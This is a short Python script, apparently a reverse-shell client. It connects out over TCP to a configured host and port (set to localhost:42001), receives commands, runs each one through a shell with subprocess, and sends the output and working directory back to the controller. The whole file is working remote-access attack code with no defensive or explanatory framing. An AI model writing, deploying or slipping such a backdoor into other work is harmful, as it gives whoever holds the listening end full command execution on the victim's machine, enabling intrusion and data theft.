import os
import subprocess
import sys
import socket

host='localhost'
port=42001

def sock_create():
    try:
        global s
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    except:
        print("Failed to create socket :")
def sock_connect():
    try:
        global s
        s.connect((host,port))
    except socket.error as err:
        print("Failed to connect :"+str(err))
def sock_commands():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data):
            term = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = term.stdout.read() + term.stderr.read()
            output_str = str(output_bytes)
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
    s.close()
                  
def main():
    sock_create()
    sock_connect()
    sock_commands()

if __name__=="__main__":
        main()
                  
    
                  
